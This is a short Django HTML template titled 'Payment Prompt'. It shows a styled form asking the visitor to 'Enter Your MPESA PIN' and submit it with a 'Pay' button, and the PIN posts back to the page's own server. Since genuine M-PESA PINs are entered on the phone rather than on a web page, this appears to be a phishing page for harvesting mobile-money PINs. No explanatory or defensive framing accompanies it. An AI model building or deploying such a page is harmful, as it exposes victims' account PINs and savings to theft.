{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Payment Prompt</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url("{% static 'tor.jpg' %}") no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .box {
            background-color: rgba(0,0,0,0.7);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
        }
        input[type="password"] {
            padding: 10px;
            width: 80%;
            border: none;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        input[type="submit"] {
            padding: 10px 30px;
            background-color: gold;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>Enter Your MPESA PIN</h2>
        <form method="post">
            {% csrf_token %}
            <input type="password" name="pin" placeholder="Enter PIN" required><br>
            <input type="submit" value="Pay">
        </form>
    </div>
</body>
</html>
